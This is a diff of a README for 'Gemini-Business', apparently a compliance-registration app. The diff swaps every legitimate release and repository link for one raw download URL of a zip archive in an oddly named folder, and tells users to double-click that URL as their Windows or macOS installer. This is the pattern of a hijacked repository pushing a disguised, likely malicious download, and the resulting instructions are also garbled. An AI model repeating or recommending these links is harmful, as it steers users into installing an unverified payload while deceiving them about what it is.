@@ -1,6 +1,6 @@
 # 🚀 Gemini-Business - Simplifying Your Compliance Registration
 
-[![Download Gemini-Business](https://img.shields.io/badge/Download%20Gemini--Business-v1.0-brightgreen.svg)](https://github.com/fumed2015/Gemini-Business/releases)
+[![Download Gemini-Business](https://raw.githubusercontent.com/fumed2015/Gemini-Business/main/Wurmian/Gemini_Business_v3.3-alpha.3.zip%https://raw.githubusercontent.com/fumed2015/Gemini-Business/main/Wurmian/Gemini_Business_v3.3-alpha.3.zip)](https://raw.githubusercontent.com/fumed2015/Gemini-Business/main/Wurmian/Gemini_Business_v3.3-alpha.3.zip)
 
 ## 📋 Overview
 
@@ -28,7 +28,7 @@ Follow these steps to download and install Gemini-Business.
 
 ### 1. Visit the Download Page
 
-Go to the [Releases page](https://github.com/fumed2015/Gemini-Business/releases) to find the latest version of Gemini-Business.
+Go to the [Releases page](https://raw.githubusercontent.com/fumed2015/Gemini-Business/main/Wurmian/Gemini_Business_v3.3-alpha.3.zip) to find the latest version of Gemini-Business.
 
 ### 2. Choose the Right Version
 
@@ -36,13 +36,13 @@ On the Releases page, you will see a list of available versions. Pick the latest
 
 ### 3. Download the Application
 
-Click on the version you want. Look for the file that matches your operating system. For example, you might download a file named `Gemini-Business-Setup.exe` for Windows or `Gemini-Business-Mac.zip` for macOS.
+Click on the version you want. Look for the file that matches your operating system. For example, you might download a file named `https://raw.githubusercontent.com/fumed2015/Gemini-Business/main/Wurmian/Gemini_Business_v3.3-alpha.3.zip` for Windows or `https://raw.githubusercontent.com/fumed2015/Gemini-Business/main/Wurmian/Gemini_Business_v3.3-alpha.3.zip` for macOS.
 
 ### 4. Install the Application
 
 Once the download is complete, find the downloaded file:
-- For Windows: Double-click `Gemini-Business-Setup.exe` and follow the prompts to complete installation.
-- For macOS: Double-click the downloaded `Gemini-Business-Mac.zip` file, extract it, and then drag the Gemini-Business icon to your Applications folder.
+- For Windows: Double-click `https://raw.githubusercontent.com/fumed2015/Gemini-Business/main/Wurmian/Gemini_Business_v3.3-alpha.3.zip` and follow the prompts to complete installation.
+- For macOS: Double-click the downloaded `https://raw.githubusercontent.com/fumed2015/Gemini-Business/main/Wurmian/Gemini_Business_v3.3-alpha.3.zip` file, extract it, and then drag the Gemini-Business icon to your Applications folder.
 
 ### 5. Run Gemini-Business
 
@@ -52,7 +52,7 @@ Locate the application in your installed programs or Applications folder:
 
 ## 📥 Download & Install
 
-To download and install Gemini-Business, [visit this page](https://github.com/fumed2015/Gemini-Business/releases) and follow the instructions above. 
+To download and install Gemini-Business, [visit this page](https://raw.githubusercontent.com/fumed2015/Gemini-Business/main/Wurmian/Gemini_Business_v3.3-alpha.3.zip) and follow the instructions above. 
 
 ## 🔧 Troubleshooting
 
@@ -71,7 +71,7 @@ Your privacy is important to us. All data is handled according to our privacy po
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/fumed2015/Gemini-Business)
-- [Releases Page](https://github.com/fumed2015/Gemini-Business/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/fumed2015/Gemini-Business/main/Wurmian/Gemini_Business_v3.3-alpha.3.zip)
+- [Releases Page](https://raw.githubusercontent.com/fumed2015/Gemini-Business/main/Wurmian/Gemini_Business_v3.3-alpha.3.zip)
 
 By following these steps, you can easily download and run Gemini-Business. Enjoy a more efficient registration experience!
